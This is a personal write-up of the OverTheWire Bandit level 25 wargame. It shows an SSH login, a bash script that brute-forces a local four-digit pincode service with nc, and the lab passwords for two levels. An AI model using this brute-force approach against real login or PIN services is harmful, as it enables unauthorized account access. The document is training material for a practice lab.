---
tags: Techniek
---
# Bandit Level 25
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Setup from [[Bandit24 - Shell script]]
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
``` 

Password:
```
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

## Method
```bash
# First, let's manually scope out the connection. 
$ ncat localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
$ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
Wrong! Please enter the correct pincode. Try again.
$ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
Wrong! Please enter the correct pincode. Try again.
# Oh dear. This will take a while.
Timeout. Exiting.
Connection closed by foreign host.

# So I will probably want to process this through a script.
# With loops. Let's create a file:
$ nano /tmp/bandit25.sh
```

My file:
```bash
#!/bin/bash

# For brevity, this is the password in every line
p="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

# The first line is password, space, 0000
s="$p 0000"

# For every combination of 4 digits...
for a in {0..9}
do
        for b in {0..9}
        do
                for c in {0..9}
                do
                        for d in {0..9}
                        do
								# append newline with password, space, pincode
                                s+="\n$p $a$b$c$d"
                        done
                done
        done
done

# Now feed the entire string of options into the nc connection and store the responses
printf "$s" | nc localhost 30002 > /tmp/bandit25.txt
```

```bash
# Make sure that our shell script is executeable!
$ chmod +x /tmp/bandit25.sh

# And then run it
$ /tmp/bandit25.sh

$ cat /tmp/bandit25.txt
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
# (...)
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```

Password: 
```
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

### See further
[[Bash]]